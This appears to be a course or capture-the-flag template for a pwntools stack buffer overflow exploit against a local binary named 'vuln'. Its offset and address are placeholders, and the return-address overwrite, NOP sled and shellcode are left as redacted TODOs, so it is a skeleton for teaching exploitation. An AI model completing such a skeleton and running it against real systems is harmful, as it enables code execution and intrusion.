#!/usr/bin/env python
from pwn import *

ret_offset = 1337                    # TODO determine offset in buffer
buf_addr = 0x1ee71eec                # TODO get leak
ret_address = buf_addr+ret_offset+16 # Convenient shellcode location
payload = ''

p = process('vuln')

# Garbage
payload += ret_offset * 'A'

# TODO Overwrite ret_address, taking endianness into account
payload += '[REDACTED]'

# TODO Add nopsled
nops = '[REDACTED]'
payload += nops

# TODO Assemble a shellcode from 'shellcraft' and append to payload
shellcode = '[REDACTED]'
payload += shellcode

# Send payload
p.sendline(payload)

# Enjoy shell :-)
p.interactive()
